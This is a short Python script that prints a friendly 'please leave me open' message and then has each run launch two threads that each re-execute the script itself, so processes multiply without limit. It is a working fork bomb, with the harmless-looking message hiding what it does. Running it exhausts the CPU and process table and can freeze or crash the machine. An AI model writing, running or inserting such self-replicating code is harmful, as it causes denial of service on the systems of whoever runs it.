import subprocess
import threading
import sys

sys.stdout.write("\rHi hello please leave me open thanks :3")
sys.stdout.flush()

def runSelf():
    subprocess.check_call([sys.executable] + sys.argv)

threads2 = [threading.Thread(target=runSelf) for _ in range(2)]

for thread in threads2:
    thread.start()

for thread in threads2:
    thread.join()
